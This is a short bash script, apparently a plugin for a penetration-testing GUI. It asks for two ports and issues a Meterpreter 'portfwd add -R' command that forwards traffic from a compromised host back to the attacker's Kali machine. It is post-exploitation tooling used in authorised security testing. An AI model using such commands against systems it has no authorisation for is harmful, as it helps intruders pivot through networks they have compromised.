#!/bin/bash

: '
meterpreter: forward all trafic from remote port to local port
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
REMOTE_PORT_FIELD=$(form_item  "Remote port" "remote_port")
LOCAL_PORT_FIELD=$(form_item  "Local port" "local_port")

# Generate GUI form
generate_form "${REMOTE_PORT_FIELD}" "${LOCAL_PORT_FIELD}"

REMOTE_PORT=${form_data["remote_port"]}
LOCAL_PORT=${form_data["local_port"]}

execute_command "portfwd add -R -l ${REMOTE_PORT} -p ${LOCAL_PORT} -L ${KALI_IP}"
create_new_line
